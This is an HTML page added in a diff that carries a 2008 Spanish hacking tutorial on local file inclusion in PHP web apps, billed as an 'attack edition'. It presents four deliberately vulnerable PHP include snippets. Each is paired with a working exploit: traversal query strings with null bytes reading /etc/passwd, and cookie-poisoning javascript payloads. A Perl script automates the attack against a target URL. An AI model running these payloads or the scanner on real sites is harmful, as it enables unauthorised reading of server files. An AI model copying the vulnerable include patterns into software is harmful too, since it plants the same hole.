@@ -1,0 +1,367 @@
+<html>
+<head>
+<title>[spanish] f**king the Web Apps [LFI #1 - attack edition]</title>
+<pre>
+﻿=-|=========================================-{ www.spanish-hackers.com }-====|
+=-| fucking the Web Apps [LFI #1 - attack edition]-==========================|
+=-|==========================================================================|
+=-[ By JosS &lt;spanish-hackers.com&gt; ]-=========================-[ 07/10/2008]-=|   
+
+
+
+ ____                  __                              __    __                
+/\  _`\               /\ \      __                    /\ \__/\ \               
+\ \ \L\_\__  __    ___\ \ \/'\ /\_\    ___      __    \ \ ,_\ \ \___      __   
+ \ \  _\/\ \/\ \  /'___\ \ , &lt; \/\ \ /' _ `\  /'_ `\   \ \ \/\ \  _ `\  /'__`\ 
+  \ \ \/\ \ \_\ \/\ \__/\ \ \\`\\ \ \/\ \/\ \/\ \L\ \   \ \ \_\ \ \ \ \/\  __/ 
+   \ \_\ \ \____/\ \____\\ \_\ \_\ \_\ \_\ \_\ \____ \   \ \__\\ \_\ \_\ \____\
+    \/_/  \/___/  \/____/ \/_/\/_/\/_/\/_/\/_/\/___L\ \   \/__/ \/_/\/_/\/____/
+                                                /\____/                        
+                                                \_/__/                         
+ __      __          __          ______                            
+/\ \  __/\ \        /\ \        /\  _  \                           
+\ \ \/\ \ \ \     __\ \ \____   \ \ \L\ \  _____   _____     ____  
+ \ \ \ \ \ \ \  /'__`\ \ '__`\   \ \  __ \/\ '__`\/\ '__`\  /',__\ 
+  \ \ \_/ \_\ \/\  __/\ \ \L\ \   \ \ \/\ \ \ \L\ \ \ \L\ \/\__, `\
+   \ `\___x___/\ \____\\ \_,__/    \ \_\ \_\ \ ,__/\ \ ,__/\/\____/
+    '\/__//__/  \/____/ \/___/      \/_/\/_/\ \ \/  \ \ \/  \/___/ 
+                                             \ \_\   \ \_\         
+                                              \/_/    \/_/         
+                                                         
+                                                        Local File Inclusion #1
+                                                                 attack edition
+
+-[ INFOS ]-----------------------------------------------------------------------
+Title: &quot;fucking the Web Apps [LFI #1]&quot;
+Version: attack edition
+Author: JosS
+
+mail: sys-project[at]hotmail[dot]com
+site: http://spanish-hackers.com
+team: Spanish Hackers Team - [SHT]
+date: 2008-10-07
+
+-[ SUMMARY ]---------------------------------------------------------------------
+	0x00: Introducción
+	0x01: Local File Inclusion
+	0x02: Exploits
+	0x03: Créditos
+
+
+                               ___ for the sake ___
+
+
+------[ 0x00.- Introducción ]
+
+Hola a todos los que están hoy aquí leyendo este 'paper' ya bien sea para repasar
+conocimientos ya adquiridos o bien para profundizar y extender sus conocimientos.
+
+Antes de empezar con la breve introducción sobre que leerás en este documento,
+quisiera presentarme. Me hago llamar JosS y soy el fundador de Spanish Hackers Team,
+una de mis pasiones dentro del ámbito informático es la de investigación de
+vulnerabilidades (Bug Research) especialmente en aplicaciones webs (Web Apps) que
+será el tema que tocaremos en este 'paper'. Les dejo mi perfil de milw0m por si 
+quieren saber más de mí.
+
+id: 1248
+profile: http://milw0rm.com/author/1248
+
+Este texto no es para nada lo que os esperáis al leer el sumario, no vamos
+a ver las técnicas en sí, lo que haremos es dejarnos de explicaciones básicas y 
+pasaremos a profundizar conocimientos. Veremos ejemplos reales no muy comunes,
+por si nos pasase en una situación real no nos quedemos con la duda de, ¿ Qué
+hago ahora?. A si que podría decir no muy atrevido que este 'paper' te abre
+la mente y tus aspiraciones a explotar vulnerabilidades de distintas formas, 
+básicamente 'Thought hacker'.
+
+Eso es lo que os espera en este aburrido y divertido 'paper'.
+
+
+------[ 0x01.- Local File Inclusion ]
+
+Vamos a ver distintas maneras de como pueden estar provocados los 'LFI' y por
+tanto a distinta programación, distinta explotación, esto es lo que buscamos:
+una mente abierta. ;)
+
+[code #1]
+
+x:  &gt;...
+ if (isset($_GET[&quot;mode&quot;]))
+
+	 {
+
+	  	if ($_GET[&quot;mode&quot;]==&quot;edit&quot;)
+
+		{
+
+		 if (isset($_GET['id']))
+
+		 {
+
+		  	$notefile = $_GET['id'];
+
+			if ($notefile == &quot;new&quot;)
+
+			{
+
+			 $title = &quot;&quot;;
+
+			 $notes = &quot;&quot;;
+
+			}
+
+			else
+
+			{
+
+			 $temp = &quot;notes/&quot; . $notefile;
+
+			 require($temp);
+
+			}
+x:  &lt;...
+x: }}}
+
+[ENDcode #1]
+
+Este es el ejemplo más simple de 'LFI' que veremos. Como vemos no tiene mucha 
+dificultad para entender su comportamiento.
+
+1) Comprueba si existe la variable 'mode' pasada por 'GET'. Si el resultado es
+   1, es decir verdadero entonces entraremos dentro de la sentencia 'IF'.
+2) Comprueba si existe la variable 'edit' pasada por 'GET'. Si el resultado es
+   1, es decir verdadero entonces entraremos dentro de la sentencia 'IF'.
+
+Continuamos avanzando ...
+
+3) Comprueba si existe la variable 'id' pasada por 'GET'. Si el resultado es
+   1, es decir verdadero entonces entraremos dentro de la sentencia 'IF'.
+4) Pasa a la variable '$notefile' el valor que asignamos a 'id' por medio de 
+   'GET' y comprueba si la variable '$notefile' es igual a 'new', en este caso 
+   nos interesa que no entre en esa sentencia de 'IF', porque no está el include 
+   que buscamos, a si que haremos que en esa condición obtengamos el valor 0 
+   y pasemos al else.
+5) Asigna a '$temp' una cadena con nuestro valor dentro de ella ($notefile).
+6) Por último hace uso de la función 'require' e incluye la cadena '$temp' con
+   nuestro valor dentro de ella.
+
+Exploit: ?mode=edit&amp;id=../../../../../../../../../../etc/passwd
+
+En caso de tener:
+$temp = &quot;notes/&quot; . $notefile . &quot;.php&quot;;
+
+El exploit tendría que tener un 'NULL BYTE' (%00h) al final de la cadena.
+
+Exploit: ?mode=edit&amp;id=../../../../../../../../../../etc/passwd%00
+
+Esto fue todo para nuestro primer ejemplo normalito, de moento todo muy 
+básico, fácil y nada que no se haya visto. ¿Continuámos?
+
+----
+
+Después de a ver calentado vamos a por el segundo ejemplo. El código
+es vulnerable a 'LFI' mediante la vulnerabilidad de 'Insecure Cookie
+Handling'. Me imagino que os preguntaréis: ¿Una vulnerabilidad dentro
+de otra? Raro no? ... pues no!. Miremos el ejemplo.
+
+[code #2]
+
+if(!empty($_COOKIE['language']) &amp;&amp; !isset($_SESSION['language'])){
+	$_SESSION['language'] = $_COOKIE['language'];
+}
+
+....
+
+if(LANG == &quot;&quot;){
+	if(!isset($_SESSION['language'])){
+		include(&quot;lang/english/lang.php&quot;);
+		$_LANG = &quot;english&quot;;
+	} else {
+		include(&quot;lang/&quot;.$_SESSION['language'].&quot;/lang.php&quot;);
+		$_LANG = $_SESSION['language'];
+	}
+
+... }
+
+[ENDcode #2]
+
+1) Comprueba si las dos variables &quot;$_COOKIE['language'] y &quot;$_SESSION['language']&quot;
+   no están definidas, en el código vemos claramente que no están definidas, por 
+   lo que entramos de lleno en el 'IF'.
+2) Debemos saber que la variable '$_COOKIE' puede ser manipulada por el usuario,
+   por lo que esa variable será nuestro vector de ataque. Como vemos en el código
+   se le asigna a &quot;$_SESSION['language']&quot; el valor de &quot;$_COOKIE['language']&quot; que 
+   será introducido por nosotros mediante la vulnerabilidad de 'Insecure Cookie
+   Handling'.
+3) Comprueba que 'LANG' no tiene valor, en este caso es afirmativo y entramos al
+   'IF'.
+4) Si no está definida &quot;$_SESSION['language']&quot; entraríamos al 'IF' pero como el
+   código pasó el valor de $_COOKIE a $_SESSION, la variable si está definida y
+   nos saltaría al 'else'.
+5) Dentro del 'else' hace uso de la función 'include' para incluir nuestra cadena.
+
+Exploit: 
+javascript:document.cookie=&quot;language=../../../../../../../../../../etc/passwd%00; path=/&quot;;
+
+Como vemos, tuvimos que añadir el NULL BYTE (%00h) porqué en el include teníamos una
+cadena que se sumaría a la nuestra y evitaría nuestro 'Directory Traversal'.
+
+¿Tenéis ganas de continuar? ... yo las tendría.
+
+----
+
+En este tercer y penúltimo ejemplo del apartado de 'LFI' tenemos una situación 
+muy parecida a la del ejemplo 2, solo que esta vez tenemos un intruso, la
+función 'explode' de PHP. Abramos la mente y pensemos como un Hacker.
+
+[code #3]
+
+x:  &gt;...
+ if (isset($HTTP_COOKIE_VARS[&quot;userInfo&quot;]) &amp;&amp; $HTTP_COOKIE_VARS[&quot;userInfo&quot;] != &quot;&quot;) {
+	$userArray = explode(&quot; &quot;, $HTTP_COOKIE_VARS[&quot;userInfo&quot;]);
+	$userName = $userArray[0];
+	$userID = $userArray[1];
+	$userLang = $userArray[2];
+	include(&quot;include/lang/$userLang/inc.messages.php&quot;);
+	}
+x:  &lt;...
+
+[ENDcode #3]
+
+Debéis saber que &quot;$HTTP_COOKIE_VARS&quot; también puede ser manipulado por el usuario, no
+os encerréis con &quot;$_COOKIE&quot;, abriros ...
+
+1) El único 'IF' del código comprueba que la variable sea distinto a 'nothing', es 
+   decir que cuando nosotros ejecutemos nuestro 'exploit' daremos valor a 
+   &quot;$HTTP_COOKIE_VARS[&quot;userInfo&quot;]&quot; y por tanto entramos de lleno en el 'IF'.
+2) La función 'explode', el intruso que nos quiere fastidiar el 'bug' separa las
+   distintas cadenas y las guarda en un 'array'.
+3) Fijaros en la linea del 'include', incluye '$userLang' que recoje el tercer valor
+   de la cadena que se encuentra en &quot;$HTTP_COOKIE_VARS[&quot;userInfo&quot;]&quot;.
+
+Proof of Concept (function 'explode' PHP):
+
+1)
+String = JosS;
+[0] = JosS;
+[1] = ;
+[2] = ; ---&gt; INCLUDE
+
+2) 
+String = JosS JosS JosS;
+[0] = JosS;
+[1] = JosS;
+[2] = JosS; ---&gt; INCLUDE
+
+¿Entendéis?, es decir que deberíamos introducir algo como: basura basura loquenosinteresa
+
+Exploit: 
+javascript:document.cookie=&quot;userInfo=JosS JosS ../../../../etc/passwd%00; path=/&quot;;
+
+
+----
+
+Para el cuarto y último ejemplo para terminar el apartado de 'LFI' tenemos una 
+situación parecida a la del ejemplo 1, es decir un LFI, que tenemos que jugar
+con los 'IF GETS' más la vulnerabilidad que permite el manejo de la 'COOKIE'.
+
+[code #4]
+
+x:  &gt;...
+ if (isset($_GET[&quot;mode&quot;]))
+	 {
+	  	if ($_GET[&quot;mode&quot;]==&quot;edit&quot;)
+		{
+		 if (isset($_GET['id']))
+		 {
+		  	$notefile = $_COOKIE['note'];
+			if ($notefile == &quot;new&quot;)
+			{
+			 $title = &quot;&quot;;
+			 $notes = &quot;&quot;;
+			}
+			else
+			{
+			 $temp = &quot;notes/&quot; . $notefile;
+			 require($temp);
+			}
+x:  &lt;...
+x: }}}
+
+[ENDcode #4]
+
+No voy a explicar nuevamente paso a paso lo que hace este código, ya que lo vimos
+en el ejemplo 1 de este apartado.
+
+Tenemos que tener en cuenta que para que nuestro de valor de '$_COOKIE' se incluya
+debemos dar positivo a los 'IF' que nos ayudan a llegar al include de nuestra
+'COOKIE'. Entonces nos quedamos con estos dos exploits.
+
+Exploit 1:
+javascript:document.cookie=&quot;note=../../../../../../../../../../etc/passwd; path=/&quot;;
+
+Exploit 2: ?mode=edit&amp;id
+
+
+------[ 0x02.- Exploits ]
+
+Yo más bien los llamaría &quot;automatizadores&quot; ya que no hacen nada más que simplificar
+el proceso y comodidad del usuario. El ejemplo está programado en Perl, ya que
+junto a python es lo que más se usa en estos casos. Veamos el código que os tengo
+preparado.
+
+[code #1]
+
+use LWP::UserAgent;
+use HTTP::Request;
+use LWP::Simple;
+
+if (!$ARGV[0])
+{
+print &quot;Usage: perl xpl.pl [HOST]\n&quot;;
+print &quot;Example: perl xpl.pl http://localhost/path/\n&quot;;
+}
+
+else
+{
+
+$web=$ARGV[0];
+chomp $web;
+
+$iny=&quot;vuln.php?vuln=../../../../../../../../../../../../../../../../etc/passwd%00&quot;;
+
+my $web1=$web.$iny;
+print &quot;$web1\n\n&quot;;
+my $ua = LWP::UserAgent-&gt;new;
+my $req=HTTP::Request-&gt;new(GET=&gt;$web1);
+$doc = $ua-&gt;request($req)-&gt;as_string;
+
+if ($doc=~ /^root/moxis ){
+print &quot;Web is vuln\n&quot;;
+}
+else
+{
+print &quot;Web is not vuln\n&quot;;
+}}
+
+[ENDcode #1]
+
+El exploit es simple y no tiene mucho misterio. Hacemos uso del módulo 'LWP' para hacer
+nuestra conexión a la web (con la inyección de explotación incluida) y mediante una
+expresión regular buscamos que se haya incluido el archivo y si es así lo muestra, en caso
+contrario sale un mensaje de error.
+
+
+------[ 0x03.- Cŕeditos ]
+
+Author: JosS
+mail: sys-project[at]hotmail[dot]com
+site: http://spanish-hackers.com
+team: Spanish Hackers Team - [SHT]
+
+work fun! 
+
+__EOF__
+
+# milw0rm.com [2008-10-07]</pre>
+</html>
